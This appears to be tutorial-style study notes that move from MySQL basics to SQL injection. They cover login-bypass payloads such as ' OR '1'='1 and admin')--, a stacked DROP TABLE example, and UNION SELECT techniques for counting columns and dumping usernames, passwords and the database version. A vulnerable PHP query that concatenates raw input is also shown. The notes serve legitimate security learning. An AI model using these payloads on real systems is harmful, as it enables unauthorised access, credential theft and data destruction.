# What is SQL Injection?

SQL Injection happens when a hacker sends input that changes a database query. 
Instead of just treating the input as normal text, the app runs it as part of the SQL command. This lets the attacker access, change, or delete data.

# Some Basic Commands:

**Login:**

`mysql -u root -p`

**Connecting remote server:**

`mysql -u root -h server_ip -P 3306 -p`

- u: username
- p: password (leave empty to enter it manually)
- h: host (default is localhost)
- P: port (default is 3306 for MySQL)


-- **Database** --

**Creating a new database:**

`CREATE DATABASE users;`

**Listing Databases:**

`SHOW DATABASES;`

**Using Database:**

`USE users;`


-- **Table** --

**Creating a Table:**

<pre>CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
);</pre>

**Viewing The table's structure:**

`DESCRIBE logins;`

**Check existing Tables:**

`SHOW TABLES;`


-- **Column Properties** --

You can make columns behave in special ways:

- AUTO_INCREMENT: Automatically increases the value (for IDs)
- NOT NULL: Column must have a value
- UNIQUE: Value must be different for every row
- DEFAULT: Sets a default value (like current date)

Example of improved table:


<pre>CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
);</pre>


This makes sure:

- Each login has a unique id
- username is unique and required
- password is required
- date_of_joining is set automatically


# Basic SQL Statements

**INSERT – Add New Data:**

`INSERT INTO logins VALUES (1, 'admin', 'p@ssw0rd', '2020-07-02');`

`INSERT INTO logins(username, password) VALUES ('administrator', 'adm1n_p@ss');`

<pre>INSERT INTO logins(username, password)
VALUES ('john', 'john123!'), ('tom', 'tom123!');</pre>

**SELECT – View Data:**

- View all data:

`SELECT * FROM logins;`

- View specific columns:

`SELECT username, password FROM logins;`

**DROP – Delete Tables or Databases**

`DROP TABLE logins;`


**ALTER – Change Table Structure**

- Add a new column:

`ALTER TABLE logins ADD newColumn INT;`

- Rename a column:

`ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;`

- Change a column type:

`ALTER TABLE logins MODIFY newerColumn DATE;`

- Delete a column:

`ALTER TABLE logins DROP newerColumn;`

**UPDATE – Edit Existing Data**

- Basic Syntax:

<pre>UPDATE table_name
SET column1 = new_value
WHERE condition;</pre>

- Example:

`UPDATE logins SET password = 'change_password' WHERE id > 1;`

This changes the password for all users with an ID greater than 1.


# Controlling Query Results

**Sorting Results:**

Use `ORDER BY` to sort rows by a specific column.

Example – Sort by password (A-Z):

`SELECT * FROM logins ORDER BY password;`

Descending order (Z-A):

`SELECT * FROM logins ORDER BY password DESC;`

Sort by multiple columns:

`SELECT * FROM logins ORDER BY password DESC, id ASC;`

**LIMIT – Show Fewer Rows:**

Use `LIMIT` to show only a specific number of rows.

Example – Show first 2 rows:

`SELECT * FROM logins LIMIT 2;`

With offset – Skip the first row, show next 2:

`SELECT * FROM logins LIMIT 1, 2;`

Offset starts at 0 (so LIMIT 1, 2 means "start at second row, show 2 rows").

**WHERE – Filter Results:**

Use `WHERE` to show only rows that meet a condition.

Example – Show users with id > 1:

`SELECT * FROM logins WHERE id > 1;`

Show user where username is 'admin':

`SELECT * FROM logins WHERE username = 'admin';`



**LIKE – Pattern Matching**

Use `LIKE` to find values based on patterns.

Example – Find usernames that start with 'admin':

`SELECT * FROM logins WHERE username LIKE 'admin%';`

`%` matches any number of characters
`_` matches exactly one character

Example – Find usernames with exactly 3 letters:

`SELECT * FROM logins WHERE username LIKE '___';`

This would match "tom", but not "john" or "admin".


# 🔹 SQL Operators – Combining Conditions

**✅ AND Operator:**

Returns TRUE only if both conditions are true.

`SELECT 1 = 1 AND 'test' = 'test';  -- Returns 1 (true)`

`SELECT 1 = 1 AND 'test' = 'abc';   -- Returns 0 (false)`


**✅ OR Operator:**

Returns TRUE if at least one condition is true.

`SELECT 1 = 1 OR 'test' = 'abc';    -- Returns 1 (true)`

`SELECT 1 = 2 OR 'test' = 'abc';    -- Returns 0 (false)`

**✅ NOT Operator:**

Flips TRUE to FALSE and vice versa.

`SELECT NOT 1 = 1;  -- Returns 0 (false)`

`SELECT NOT 1 = 2;  -- Returns 1 (true)`

**🔣 Symbol Versions:**

You can also use:

- `&&` for `AND`
- `||` for `OR`
- `!` for `NOT`

<pre>SELECT 1 = 1 && 'test' = 'abc';    -- Returns 0
SELECT 1 = 1 || 'test' = 'abc';    -- Returns 1
SELECT 1 != 1;                     -- Returns 0</pre>

**🧪 Operators in Queries**

Example – Get all users except 'john':

`SELECT * FROM logins WHERE username != 'john';`

Example – Get users with id > 1 and not 'john':

`SELECT * FROM logins WHERE username != 'john' AND id > 1;`

**⚙️ Operator Precedence (Order of Execution)**

SQL follows a priority order when multiple operators are used. Higher ones are done first:

- *, /, %
- +, -
- Comparisons (=, >, <, !=, LIKE)
- NOT
- AND
- OR

🔍 Example with Precedence:

SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;

This is evaluated like:

SELECT * FROM logins WHERE username != 'tom' AND id > 1;

It first calculates 3 - 2, then checks the conditions, and finally applies AND.

# Intro to SQL Injection

**Using User Input in Queries**

Apps often include user input in SQL queries, like this search feature:

<pre>$searchInput = $_POST['findUser'];
$query = "SELECT * FROM logins WHERE username LIKE '%$searchInput'";</pre>

Problem: If this input isn't sanitized (cleaned), it can lead to SQL injection.

**Example Injection:**

If the user inputs:

`1'; DROP TABLE users; --`

The full query becomes:

`SELECT * FROM logins WHERE username LIKE '%1'; DROP TABLE users;--'`

This could delete the entire users table!

**❌ Syntax Errors from Bad Input**

The example above causes an error:

Error: `syntax error near "'"`

This happens when the injected SQL breaks the query format — e.g., unmatched quotes.

To avoid errors and make injections work, attackers often:

Use comments (--) to cut off the rest of the query

Or balance the quotes properly

**📚 Types of SQL Injections**

There are three main types of SQL injection attacks:

1. 🧪 In-Band Injection

Output is directly visible on the page.

Union-based: Adds results to the current output using UNION SELECT.

Error-based: Triggers SQL errors that leak information.

2. 🕵️ Blind Injection

No output is shown — attackers guess the result based on page behavior.

Boolean-based: True/False conditions control page content.

Time-based: Uses SLEEP() to delay response if a condition is true.

3. 📤 Out-of-Band Injection

Sends data to an external location (e.g., via DNS requests) if direct access isn’t possible.


# Subverting Query Logic

**🔐 Authentication Bypass**

Imagine a login page with this SQL query:

`SELECT * FROM logins WHERE username='admin' AND password='p@ssw0rd';`

If both the username and password match, the login is successful. If either is wrong, it fails.

**🧪 Discovering SQL Injection**

To test if the login form is vulnerable, we try injecting characters like ', ", or # in the input fields.

Example:

Entering `'` as the username might cause this query:

`SELECT * FROM logins WHERE username=''' AND password='something';`

This throws a syntax error, revealing that the input is directly included in the SQL statement. That means it's vulnerable.

**✅ Bypassing with OR Injection**

We want the query to return true no matter what we enter. The trick is to inject something like:

`admin' OR '1'='1`

This changes the SQL query to:

`SELECT * FROM logins WHERE username='admin' OR '1'='1' AND password='something';`

Since '1'='1' is always true, the query will succeed even with the wrong password.

**🧠 Note: SQL evaluates AND before OR, but '1'='1' still causes the overall query to return true.**



**❓ What if the Username is Unknown?**

If you enter a fake username like notAdmin, it fails:

`SELECT * FROM logins WHERE username='notAdmin' OR '1'='1' AND password='something';`

Why? Because `username='notAdmin'` is false, and `'1'='1' AND password='something'` is also false (because the password doesn’t match any real user).

**✅ Bypassing from the Password Field**

You can bypass it even if the username is invalid by injecting in the password field:

Input:

- Username: `anything`
- Password: `something' OR '1'='1`

Query becomes:

`SELECT * FROM logins WHERE username='anything' AND password='something' OR '1'='1';`

Now `'1'='1'` makes the query return true, and you get logged in—usually as the first user in the database (often admin).

**🧪 Final Working Payload**

You can simply enter:

Username: `' OR '1'='1`
Password: `' OR '1'='1`

Which results in:

`SELECT * FROM logins WHERE username='' OR '1'='1' AND password='' OR '1'='1';`

✅ This always returns true → Login bypassed.

# 🗨️ Using Comments in SQL Injection


| Type         | Example                    | Notes                                       |
| ------------ | -------------------------- | ------------------------------------------- |
| `-- ` (dash) | `-- this is a comment`     | Must be followed by a **space**             |
| `#` (hash)   | `# this is also a comment` | May need to be URL-encoded as `%23` in URLs |
| `/* */`      | `/* this is a comment */`  | Not usually used in basic SQL injection     |


**✨ Example: Using -- to Bypass Login**

Let's say the website uses this SQL query for login:

`SELECT * FROM logins WHERE username='admin' AND password='something';`

If we inject admin'-- as the username, it becomes:

`SELECT * FROM logins WHERE username='admin'-- ' AND password='something';`

🔍 The part after -- is ignored. So the query is now just:

`SELECT * FROM logins WHERE username='admin';`

✅ The password check is bypassed → Login successful.

**⚠️ Note About URLs**

- `--` becomes `--+` in URLs (the space is encoded as +)
- `#` becomes `%23` in URLs

**🧪 Real Case: Parentheses & Hashed Passwords**

Let’s look at a more complex query:

`SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password='hashed_pw';`

Even if the password is correct, the query will fail for admin if their id is 1.

💡 You can't inject in the password field here because it gets hashed. But you can still bypass with a clever username.

**❌ Failing Example**

Username: `admin'--`

Query becomes:

`SELECT * FROM logins WHERE (username='admin'--' AND id > 1) AND password='hash';`

⛔ Syntax error: unmatched parenthesis.

**✅ Fixing with Parenthesis**

Username: `admin')--`

Final query:

`SELECT * FROM logins WHERE (username='admin')-- AND id > 1) AND password='hash';`

🟢 The rest of the condition is ignored, and only the username check is run.

✅ Login successful as admin.

# 🔗 UNION Clause in SQL Injection

The `UNION` keyword in SQL is used to combine the results of two or more `SELECT` statements into a single result.

`SELECT * FROM ports UNION SELECT * FROM ships;`

| code/Ship | city      |
| --------- | --------- |
| CN SHA    | Shanghai  |
| SG SIN    | Singapore |
| ZZ-21     | Shenzhen  |
| Morrison  | New York  |

**Note that the last table is `SELECT * FROM ships`!**



**💉 UNION SQL Injection**

You can use `UNION` in an injection to extract data from other tables.

Suppose the original query is:

`SELECT * FROM products WHERE product_id = 'user_input';`

Inject:

`' UNION SELECT username, password FROM users--`

Final query becomes:

<pre>SELECT * FROM products WHERE product_id = '1' 
UNION 
SELECT username, password FROM users--</pre> 

✅ Now you can dump usernames and passwords, assuming both queries return 2 columns.

**🧱 What If the Columns Don’t Match?**

If your target query has more columns, but you only want 1 or 2 values (like username), you need to fill the rest with junk or placeholder data (e.g., numbers or NULL).

Example: The Original table has 4 columns.

You inject:

`' UNION SELECT username, 2, 3, 4 FROM users--`

Result:

| Col1  | Col2 | Col3 | Col4 |
| ----- | ---- | ---- | ---- |
| admin | 2    | 3    | 4    |


✅ You got the username, and filled the rest with dummy values.

**💡 Tips**

Use NULL as placeholder—it works with any data type:

`UNION SELECT username, NULL, NULL, NULL FROM users--`

Using numbers helps track column positions and debug your injection.


# Union Injection


**🔢 Step 1: Find the Number of Columns**

Before we can use UNION, we need to know how many columns the original query is using.

**✅ Method 1: ORDER BY**

Try injecting:

`' ORDER BY 1-- -`

Keep increasing the number:

`' ORDER BY 2-- -`
`' ORDER BY 3-- -`
`' ORDER BY 4-- -`
`' ORDER BY 5-- -`

Once you get an error, you’ve gone too far. For example:

If `ORDER BY 4` works and `ORDER BY 5` gives an error, then there are 4 columns.

**✅ Method 2: UNION SELECT**

Try injecting:

`cn' UNION SELECT 1,2,3-- -`

If it gives an error, increase the number of values:

`cn' UNION SELECT 1,2,3,4-- -`

If this works and returns results, then there are 4 columns.

**🎯 Step 2: Find Which Columns Are Displayed**

Sometimes, not all columns from the query are shown on the page. To find out which columns are printed, inject numbers and look at which ones appear in the output.

Example:

`cn' UNION SELECT 1,2,3,4-- -`

If you see only 2, 3, and 4 on the page, it means:

- Column 1 is not printed
- Columns 2–4 are printed

So, to show your own data, place it in one of the printed columns.

**🧪 Step 3: Test with Real Data**

Now replace one of the numbers with real SQL data, like the database version:

`cn' UNION SELECT 1,@@version,3,4-- -`

If you see something like `10.3.22-MariaDB`, it means:

✅ Your injection is working, and you're able to extract data.



